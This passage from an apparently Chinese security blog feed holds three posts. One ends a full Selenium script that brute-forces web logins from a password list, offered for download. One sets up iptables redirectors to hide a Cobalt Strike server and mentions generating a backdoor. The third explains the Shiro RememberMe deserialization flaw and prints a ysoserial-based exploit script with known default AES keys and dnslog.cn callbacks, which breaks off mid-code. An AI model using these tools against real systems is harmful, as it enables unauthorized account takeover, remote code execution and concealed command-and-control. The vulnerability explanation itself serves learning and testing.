class="line">self.chrome.find_element_by_css_selector((&quot;[class&#x3D;&#39;class_name&#39;]&quot;)).send_keys(Keys.RETURN)</span><br></pre></td></tr></table></figure><p>好了这里基本上解决了所以的坑点,但是实际的坑点很多,我只是把主要的几点放出来讲了一下,最终代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">from selenium.webdriver.common.desired_capabilities import DesiredCapabilities</span><br><span class="line">from browsermobproxy import Server</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line">class Brower_scan():</span><br><span class="line">def __init__(self,url,username,password_dir):</span><br><span class="line">self.url &#x3D; url</span><br><span class="line">self.response_result &#x3D; []</span><br><span class="line">self.result&#x3D;&#123;&#125;</span><br><span class="line">self.init_browsermobproxy()</span><br><span class="line">self.init_chrome()</span><br><span class="line">self.init_dict_list(username,password_dir)</span><br><span class="line">self.result_handing()</span><br><span class="line">self.end_env()</span><br><span class="line">def init_dict_list(self,username,password_dir):</span><br><span class="line">with open(password_dir,&quot;r&quot;) as f:</span><br><span class="line">self.password_list &#x3D; f.readlines()</span><br><span class="line">for password in self.password_list:</span><br><span class="line">self.fill_out_a_form(username,password.replace(&#39;\n&#39;,&#39;&#39;))</span><br><span class="line">self.wget_response()</span><br><span class="line">def init_browsermobproxy(self):</span><br><span class="line">self.server &#x3D; Server(&quot;browsermob-proxy-2.1.4\\bin\\browsermob-proxy.bat&quot;)#browermobproxy文件的位置</span><br><span class="line">self.server.start()</span><br><span class="line">self.proxy &#x3D; self.server.create_proxy()</span><br><span class="line">self.chrome_options &#x3D; Options()</span><br><span class="line">self.chrome_options.add_argument(&quot;–incognito&quot;)</span><br><span class="line">self.chrome_options.add_argument(&#39;--proxy-server&#x3D;&#123;0&#125;&#39;.format(self.proxy.proxy))</span><br><span class="line">self.chrome_options.add_argument(&#39;--headless&#39;)#这里加了一个参数,不启动chrome浏览器,省去了启动的时间,更快了</span><br><span class="line">def init_chrome(self):</span><br><span class="line">try:</span><br><span class="line">self.chrome &#x3D; webdriver.Chrome(chrome_options&#x3D;self.chrome_options)</span><br><span class="line">self.proxy.new_har(&quot;test&quot;, options&#x3D;&#123;&#39;captureContent&#39;: True, &#39;captureHeaders&#39;: True&#125;)</span><br><span class="line">self.chrome.get(self.url)</span><br><span class="line">except Exception as e:</span><br><span class="line">print(&quot;Chrome浏览器启动失败！\n&quot;)</span><br><span class="line">return 0</span><br><span class="line">def fill_out_a_form(self,username,password):</span><br><span class="line">print(password)</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).clear()#清空username输入框的标签</span><br><span class="line"></span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input ivu-input-large ivu-input-with-prefix&#39;]&quot;).send_keys(</span><br><span class="line">username)#输入用户名</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;ivu-input ivu-input-large ivu-input-with-prefix ivu-input-with-suffix&#39;]&quot;).clear()#清空password输入框的标签</span><br><span class="line">self.chrome.find_element_by_css_selector(</span><br><span class="line">&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(password)#输入用户名</span><br><span class="line">self.chrome.find_element_by_css_selector(&quot;[class&#x3D;&#39;class_name&#39;]&quot;).send_keys(Keys.RETURN)#点击登录</span><br><span class="line"></span><br><span class="line">def wget_response(self):</span><br><span class="line">result &#x3D; self.proxy.har</span><br><span class="line">for entry in result[&#39;log&#39;][&#39;entries&#39;]:</span><br><span class="line">_url &#x3D; entry[&#39;request&#39;][&#39;url&#39;]</span><br><span class="line">if &quot;password&quot; in _url and &quot;username&quot; in _url:</span><br><span class="line">_response &#x3D; entry[&#39;response&#39;]</span><br><span class="line">_content &#x3D; _response[&#39;content&#39;]</span><br><span class="line"># 获取接口返回内容</span><br><span class="line">self.response_result.append(_response[&#39;content&#39;][&#39;text&#39;])</span><br><span class="line">self.result &#x3D; dict(zip(self.password_list, self.response_result))</span><br><span class="line">def result_handing(self):</span><br><span class="line">for key,value in self.result.items():</span><br><span class="line">print(&quot;密码：&#123;key&#125; :结果：&#123;result&#125;&quot;.format(key&#x3D;key,result&#x3D;value))</span><br><span class="line">def end_env(self):</span><br><span class="line">try:</span><br><span class="line">self.server.stop()</span><br><span class="line">self.chrome.quit()</span><br><span class="line">find_netstat &#x3D; os.popen(&quot;netstat -ano | findstr 8080&quot;)#开的什么端口杀什么端口的进程</span><br><span class="line">pid &#x3D; find_netstat.read().split()[4]</span><br><span class="line">kail_pid &#x3D; os.popen(&quot;taskkill &#x2F;F &#x2F;PID &#123;PID&#125;&quot;.format(PID&#x3D;pid))</span><br><span class="line">print(kail_pid.read())</span><br><span class="line">return 1</span><br><span class="line">except IndexError as e:</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">Brower &#x3D; Brower_scan(url,&#39;admin&#39;,&#39;password.txt&#39;)</span><br></pre></td></tr></table></figure><p>这里仅仅把这种方式利用在密码爆破上面,但是实际的利用场景远不止这些,我觉得可以利用任何js加密,jq加密的,前端加密的场景,都可以用到,根本不需要去分析它的js前端加密代码,只需要把爆破行为模拟正常的用户行为就欧克了,不得不说,这种智能的方式真的太方便了!太香了!!!!!!!!</p><p>github已经上传了一个我已经写好的爆破登录界面账号和密码的,大家可以去下载自行享用!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Gamma-laboratory&#x2F;JsFak</span><br><span class="line">现在只支持通过class来查找输入框和登录按钮，如果需要通过id或其他标识，可以修改源码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具推送 </tag>
            
            <tag> JaFak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设置iptables规则来保护CS服务器</title>
      <link href="2020/12/11/%E8%AE%BE%E7%BD%AEiptables%E8%A7%84%E5%88%99%E6%9D%A5%E4%BF%9D%E6%8A%A4CS%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>2020/12/11/%E8%AE%BE%E7%BD%AEiptables%E8%A7%84%E5%88%99%E6%9D%A5%E4%BF%9D%E6%8A%A4CS%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>之前在网络上看到大多都使用socat这个工具进行流量转发，但最近和一些师傅交流了解到，有时候使用socat进行转发的时候其稳定性以及速率可能不是那么好，对于流量比较多的情况也许可以使用iptables进行此操作，同时对cs服务器设定一些访问策略，对真实的cs服务器起到一定保护作用。这里简单说一下iptables在此场景的使用，各位师傅如有其他的思路或者工具还请多多交流</p><h1 id="iptables中的“四表五链”及“拥堵策略”"><a href="#iptables中的“四表五链”及“拥堵策略”" class="headerlink" title="iptables中的“四表五链”及“拥堵策略”"></a>iptables中的“四表五链”及“拥堵策略”</h1><p>“四表”是指，iptables的功能——filter, nat, mangle, raw</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filter：控制数据包是否允许进出及转发（INPUT、OUTPUT、FORWARD）,可以控制的链路 有input, forward, output</span><br><span class="line"></span><br><span class="line">nat：控制数据包中地址转换，可以控制的链路有prerouting（路由前）, input, output, postrouting</span><br><span class="line"></span><br><span class="line">mangle：修改数据包中的原数据，可以控制的链路有prerouting）, input, forward, output, postrouting</span><br><span class="line"></span><br><span class="line">raw：控制nat表中连接追踪机制的启用状况，可以控制的链路有prerouting, output</span><br></pre></td></tr></table></figure><p>有关iptables具体介绍可以看下面这篇文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;vathe&#x2F;p&#x2F;6973656.html</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables –[A|I 链] [-i|o 网络接口] [-p 协议] [-s 来源ip&#x2F;网域] [-d 目标ip&#x2F;网域] –j[ACCEPT|DROP]</span><br></pre></td></tr></table></figure><h1 id="Iptables设置"><a href="#Iptables设置" class="headerlink" title="Iptables设置"></a>Iptables设置</h1><p>首先我需要在跳板机A上使用以下命令将8081端口接收到的流量转发至CS服务器的80端口 （协议和端口可自由替换）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m tcp --dport 8081 -j ACCEPT</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 8081 -j DNAT --to-destination xxx.xxx.xxx.xxx:8081&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>这个45323是我的teamserver连接端口，我也给转发到跳板机上去了，以后都从跳板机进行登录了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m tcp --dport 45323 -j ACCEPT iptables -t nat -A PREROUTING -p tcp --dport 45323 -j DNAT --to-destination xxx.xxx.xxx.xxx:45323 iptables -t nat -A POSTROUTING -j MASQUERADE sysctl net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure><p>使用iptables -nL –line-number -t 表名 查看当前设置好的规则</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2838388474.png"></p><p>然后我们在cs服务器上设置对8081端口，以及45323端口的访问控制，以及在cs服务器上设置 对整个服务器（全部ip）禁止9100端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 8081 -j DROP</span><br><span class="line">iptables -I INPUT -p tcp --dport 45323 -j DROP &#x2F;&#x2F;只允许跳板机访问这些端口端口 </span><br><span class="line">iptables -I INPUT -s xxx.xxx.xxx.xxx -p tcp --dport 8081 -j ACCEPT</span><br><span class="line">iptables -I INPUT -s xxx.xxx.xxx.xxx -p tcp --dport 45323 -j ACCEPT</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2057200037.png"></p><p>我们可以看到 截图里同意来自xxxx访问45323,8081端口，拒绝了其他地址对45323以及8081端口的访问，iptables的策略设置完成</p><h1 id="CS配置以及应用"><a href="#CS配置以及应用" class="headerlink" title="CS配置以及应用"></a>CS配置以及应用</h1><p>ok 我们打开cs 连接试一下</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3990699447.png"></p><p>不出意外连接失败</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2158157351.png"></p><p>把服务器地址改成跳板机的ip</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/490499920.png"></p><p>ok 连接成功<br>然后我们建立一个http的监听器看看，host和stager都填写我的跳板机</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4053962516.png"></p><p>简单生成一个后门</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1039569425.png"></p><p>运行上线，可以看到cs的web日志显示出我的跳板机访问了 checksum8算法生成的url</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1522326179.png"></p><p>最近看到一些文章通过URL的生成算法，以及对Beacon stage的解析来寻找Beacon staging server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;WUf96myUi8F3X_eNWPRTdw</span><br></pre></td></tr></table></figure><p>对于如何Bypass cs beacon的扫描，各位可以看下这篇文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;fhcTTWV4Ddz4h9KxHVRcnw</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3131949141.png"></p><p>访问跳板机的此目录可下载stage文件，直接访问真实的cs服务器则无法下载。当然这种办法治标不治本，只能对真实的cs服务器起到那么一点保护作用，cs服务器的一些前期隐藏工作和检测规避手段网上有很多，这里就不一一举例了。</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文看懂shiro反序列化漏洞</title>
      <link href="2020/12/09/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>2020/12/09/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p><h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。</p><p>Shiro记住用户会话功能的逻辑如下：</p><p>获取RememberMe的值 —&gt; Base64解密 —&gt; ASE解密 –&gt; 反序列化<br>在服务端接收cookie值时，按照如下步骤来解析处理：<br>1、检索RememberMe cookie 的值<br>2、Base 64解码<br>3、使用AES解密(加密密钥硬编码)<br>4、进行反序列化操作（未作过滤处理）<br>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>因为在反序列化时,不会对其进行过滤,所以如果传入恶意代码将会造成安全问题<br>在 1.2.4 版本前,是默认ASE秘钥,Key: kPH+bIxk5D2deZiIxcaaaA==,可以直接反序列化执行恶意代码<br>而在1.2.4之后,ASE秘钥就不为默认了,需要获取到Key才可以进行渗透</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 8081:8080 medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">访问 http:&#x2F;&#x2F;127.0.0.1:8081即可</span><br></pre></td></tr></table></figure><p>漏洞扫描:shiro_scan.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python2.7</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">&#x27;ysoserial.jar&#x27;</span></span><br><span class="line"></span><br><span class="line">CipherKeys = [</span><br><span class="line">    <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3AvVhmFLUs0KTA3Kprsdag==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2AvVhdsgUs0FSA3SDFAdag==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;6ZmI6I2j5Y+R5aSn5ZOlAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wGiHplamyXlVB11UXWol8g==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cmVtZW1iZXJNZQAAAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Z3VucwAAAAAAAAAAAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ZnJlc2h6Y24xMjM0NTY3OA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;L7RioUULEFhRyxM7a2R/Yg==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;RVZBTk5JR0hUTFlfV0FPVQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fCq+/xW488hMTCD+cmJ3aQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;WkhBTkdYSUFPSEVJX0NBVA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;1QWLxg+NYmxraMoxAXu/Iw==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;WcfHGU25gNnTxTlmJMeSpw==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;a2VlcE9uR29pbmdBbmRGaQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bWluZS1hc3NldC1rZXk6QQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;5aaC5qKm5oqA5pyvAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="comment">#&quot;ZWvohmPdUsAWT3=KpPqda&quot;,</span></span><br><span class="line">    <span class="string">&quot;r0e3c16IdVkouZgk1TKVMg==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ZUdsaGJuSmxibVI2ZHc9PQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;U3ByaW5nQmxhZGUAAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LEGEND-CAMPUS-CIPHERKEY==&quot;</span></span><br><span class="line">    <span class="comment">#&quot;kPv59vyqzj00x11LXJZTjJ2UHW48jzHN&quot;,</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="string">&quot;JRMPClient&quot;</span>,<span class="string">&quot;BeanShell1&quot;</span>,<span class="string">&quot;Clojure&quot;</span>,<span class="string">&quot;CommonsBeanutils1&quot;</span>,<span class="string">&quot;CommonsCollections1&quot;</span>,<span class="string">&quot;CommonsCollections2&quot;</span>,<span class="string">&quot;CommonsCollections3&quot;</span>,<span class="string">&quot;CommonsCollections4&quot;</span>,<span class="string">&quot;CommonsCollections5&quot;</span>,<span class="string">&quot;CommonsCollections6&quot;</span>,<span class="string">&quot;CommonsCollections7&quot;</span>,<span class="string">&quot;Groovy1&quot;</span>,<span class="string">&quot;Hibernate1&quot;</span>,<span class="string">&quot;Hibernate2&quot;</span>,<span class="string">&quot;JSON1&quot;</span>,<span class="string">&quot;JavassistWeld1&quot;</span>,<span class="string">&quot;Jython1&quot;</span>,<span class="string">&quot;MozillaRhino1&quot;</span>,<span class="string">&quot;MozillaRhino2&quot;</span>,<span class="string">&quot;Myfaces1&quot;</span>,<span class="string">&quot;ROME&quot;</span>,<span class="string">&quot;Spring1&quot;</span>,<span class="string">&quot;Spring2&quot;</span>,<span class="string">&quot;Vaadin1&quot;</span>,<span class="string">&quot;Wicket1&quot;</span>]</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genpayload</span>(<span class="params">params, CipherKey,fp</span>):</span></span><br><span class="line">    gadget,command = params</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;jar file not found&#x27;</span>)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,fp,gadget,command],</span><br><span class="line">                            stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    <span class="comment">#print(command)</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    <span class="comment">#key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(CipherKey), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdomain</span>():</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        ret = session.get(<span class="string">&quot;http://www.dnslog.cn/getdomain.php?t=&quot;</span>+<span class="built_in">str</span>(random.randint(<span class="number">100000</span>,<span class="number">999999</span>)),timeout=<span class="number">10</span>).text</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;getdomain error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        ret = <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrecord</span>():</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        ret = session.get(<span class="string">&quot;http://www.dnslog.cn/getrecords.php?t=&quot;</span>+<span class="built_in">str</span>(random.randint(<span class="number">100000</span>,<span class="number">999999</span>)),timeout=<span class="number">10</span>).text</span><br><span class="line">        <span class="comment">#print(ret)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;getrecord error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        ret = <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span 